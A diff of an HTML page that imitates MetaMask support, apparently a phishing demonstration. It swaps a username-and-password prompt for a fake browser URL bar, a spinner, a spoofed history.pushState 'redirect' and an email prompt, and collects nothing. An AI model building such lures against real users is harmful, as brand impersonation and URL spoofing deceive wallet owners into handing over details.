@@ -6,85 +6,82 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
-      background-color: #f6851b;
-      font-family: Arial, sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
-    }
-
-    .card {
       background-color: white;
-      padding: 30px;
-      border-radius: 12px;
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
-      text-align: center;
-      max-width: 400px;
-      width: 100%;
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 20px;
     }
 
-    .metamask-logo {
-      width: 80px;
-      margin-bottom: 20px;
+    .header {
+      display: flex;
+      align-items: center;
+      gap: 10px;
     }
 
-    h2 {
+    .header img {
+      width: 40px;
+    }
+
+    .header h1 {
+      font-size: 20px;
       color: #f6851b;
-      margin-bottom: 10px;
     }
 
-    p {
-      color: #333;
-      font-size: 16px;
+    .content {
+      margin-top: 50px;
+      max-width: 600px;
     }
 
-    .url-box {
-      background-color: #f0f0f0;
-      padding: 10px;
-      margin: 15px 0;
-      border-radius: 8px;
+    .loader {
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #f6851b;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin: 20px auto;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .fake-url-bar {
       font-family: monospace;
-      color: #333;
-      word-break: break-all;
-    }
-
-    button {
-      background-color: #f6851b;
-      color: white;
-      border: none;
-      padding: 10px 20px;
-      font-size: 16px;
-      border-radius: 8px;
-      cursor: pointer;
-    }
-
-    button:hover {
-      background-color: #e27400;
+      font-size: 14px;
+      color: gray;
+      background-color: #eee;
+      padding: 8px;
+      border-radius: 4px;
+      margin-bottom: 20px;
     }
   </style>
 </head>
 <body>
 
-  <div class="card">
-    <img class="metamask-logo" src="https://seeklogo.com/images/M/metamask-logo-09EDE53DBD-seeklogo.com.png" alt="MetaMask Logo">
-    <h2>Connect with MetaMask Support</h2>
-    <p>Click below to start contacting MetaMask support:</p>
-    <div class="url-box">https://support.metamask.io</div>
-    <button onclick="fakeSupport()">🔗 Contact Support</button>
+  <div class="fake-url-bar">https://support.metamask.io</div>
+
+  <div class="header">
+    <img src="https://seeklogo.com/images/M/metamask-logo-09EDE53DBD-seeklogo.com.png" alt="MetaMask Logo">
+    <h1>MetaMask Support</h1>
+  </div>
+
+  <div class="content">
+    <p>Redirecting to MetaMask support page...</p>
+    <div class="loader"></div>
   </div>
 
   <script>
-    function fakeSupport() {
-      let username = prompt("Enter your username:");
-      if (!username) return;
+    // Simulasi redirect ke support.metamask.io
+    setTimeout(() => {
+      history.pushState({}, "", "https://support.metamask.io");
+    }, 1000);
 
-      let password = prompt("Enter your password:");
-      if (!password) return;
-
-      alert("Your credentials:\nUsername: " + username + "\nPassword: " + password);
-    }
+    // Munculkan prompt setelah "redirect"
+    setTimeout(() => {
+      prompt("MetaMask Support\nPlease enter your email to continue:");
+    }, 3000); // 3 detik setelah halaman dibuka
   </script>
 
 </body>
